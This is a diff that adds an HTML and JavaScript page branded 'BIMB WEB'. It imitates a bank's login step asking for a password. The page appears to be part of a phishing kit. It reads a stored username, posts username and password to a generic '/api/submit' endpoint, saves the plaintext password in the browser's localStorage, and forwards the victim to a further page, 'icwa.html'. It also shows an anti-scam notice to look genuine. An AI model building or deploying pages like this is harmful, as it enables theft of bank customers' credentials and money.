@@ -1,0 +1,233 @@
+<!DOCTYPE html><html lang="en"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>BIMB WEB</title>
+  <link rel="icon" type="image/x-icon" href="images/BIMB.png">
+  <link rel="stylesheet" href="css/all.min.css">
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #fff;
+    }
+    .container {
+      max-width: 400px;
+      margin: auto;
+      padding: 20px;
+    }
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .header .back-icon, .header .shield-icon {
+      font-size: 20px;
+      cursor: pointer;
+    }
+    .content {
+      margin-top: 30px;
+    }
+    .content h1 {
+      font-size: 24px;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+    .content p {
+      font-size: 16px;
+      color: #888;
+      margin-bottom: 20px;
+    }
+    .input-container {
+      position: relative;
+      margin-bottom: 20px;
+    }
+    .input-container input {
+      width: 90%;
+      padding: 12px 15px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      outline: none;
+    }
+    .input-container .eye-icon {
+      position: absolute;
+      top: 50%;
+      right: 15px;
+      transform: translateY(-50%);
+      cursor: pointer;
+    }
+    .forgot-link {
+      text-align: right;
+      display: block;
+      color: #b74747;
+      font-size: 14px;
+      margin-bottom: 20px;
+      text-decoration: none;
+    }
+    .notice {
+      border: 1px solid #000;
+      border-radius: 10px;
+      padding: 15px;
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    .notice .icon {
+      font-size: 20px;
+      margin-bottom: 10px;
+    }
+    .notice p {
+      font-size: 14px;
+      color: #333;
+      margin: 0;
+    }
+    .btn-next {
+      width: 100%;
+      padding: 15px;
+      background-color: #d32752;
+      color: #fff;
+      border: none;
+      border-radius: 50px;
+      font-size: 18px;
+      text-align: center;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+    <div class="container">
+      <!-- Header -->
+      <div class="header">
+       <a href="index.html"><i class="fa fa-arrow-left back-icon"></i></a> 
+        <i class="fa fa-shield-alt shield-icon"></i>
+      </div>
+  
+      <!-- Content -->
+      <div class="content">
+        <p id="usernameDisplay">Guest</p>
+        <h1>Password, please</h1>
+  
+        <!-- Form -->
+        <form id="secondForm">
+          <div class="input-container">
+            <input type="password" placeholder="What's your password?" id="passwordInput" name="password">
+            <i class="fa fa-eye-slash eye-icon" onclick="togglePasswordVisibility()"></i>
+          </div>
+  
+          <!-- Forgot Login Details -->
+          <a href="#" class="forgot-link">Forgot Login Details?</a>
+          <br><br><br><br><br><br><br>
+  
+          <!-- Important Notice -->
+          <div class="notice">
+            <div class="icon">
+              <i class="fa fa-bell"></i>
+            </div>
+            <p><strong>Important Notice</strong></p>
+            <p>Stay vigilant, protect yourself from scams, and never share sensitive information with unknown sources.</p>
+          </div>
+  
+          <!-- Next Button -->
+          <button class="btn-next" type="submit">Next</button>
+        </form>
+      </div>
+    </div>
+  
+    <script src="js/jquery-3.6.0.min.js"></script>
+  
+    <script>
+        document.querySelector('.forgot-link').addEventListener('click', function (event) {
+    event.preventDefault(); // Mencegah tautan dari melakukan navigasi
+    alert('Please contact BIMB support at email: support@bimb.com or call us at +603-26 900 900.');
+    });
+
+
+      // Function to retrieve username from localStorage and display it
+      document.addEventListener('DOMContentLoaded', function() {
+        const username = localStorage.getItem('username');
+        if (username) {
+          document.getElementById('usernameDisplay').innerText = username;
+        } else {
+          document.getElementById('usernameDisplay').innerText = 'Guest';
+        }
+      });
+  
+      // Function to toggle password visibility
+      function togglePasswordVisibility() {
+        const passwordInput = document.getElementById('passwordInput');
+        const eyeIcon = document.querySelector('.eye-icon');
+        if (passwordInput.type === 'password') {
+          passwordInput.type = 'text';
+          eyeIcon.classList.remove('fa-eye-slash');
+          eyeIcon.classList.add('fa-eye');
+        } else {
+          passwordInput.type = 'password';
+          eyeIcon.classList.remove('fa-eye');
+          eyeIcon.classList.add('fa-eye-slash');
+        }
+      }
+  
+      // Tampilkan username di halaman
+  document.addEventListener('DOMContentLoaded', function () {
+    const username = localStorage.getItem('username');
+    if (username) {
+      document.getElementById('usernameDisplay').innerText = username;
+    } else {
+      document.getElementById('usernameDisplay').innerText = 'Guest';
+    }
+  });
+
+  // Function to handle form submission
+$('#secondForm').on('submit', function (e) {
+  e.preventDefault();
+
+  const username = localStorage.getItem('username'); // Ambil username dari localStorage
+  const password = $('#passwordInput').val();
+
+  if (!password.trim()) {
+    alert('Please enter your password.');
+    return;
+  }
+
+  if (password.length < 8 || password.length > 30) {
+    alert('Password must be between 8 and 30 characters.');
+    return;
+  }
+
+  // Kirim ke backend
+  fetch('/api/submit', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      username,
+      password
+    })
+  })
+    .then(response => {
+      if (!response.ok) throw new Error('Failed');
+      return response.json();
+    })
+    .then(() => {
+      localStorage.setItem('password', password);
+      window.location.href = 'icwa.html';
+    })
+    .catch(() => {
+      alert('Failed to process the data. Please try again.');
+    });
+});
+
+// Batasi jumlah karakter password saat mengetik
+$('#passwordInput').on('input', function () {
+  const password = $(this).val();
+  if (password.length > 30) {
+    $(this).val(password.substring(0, 30)); // Potong ke 30 karakter pertama
+  }
+});
+
+    </script>
+  
+  
+
+</body></html>
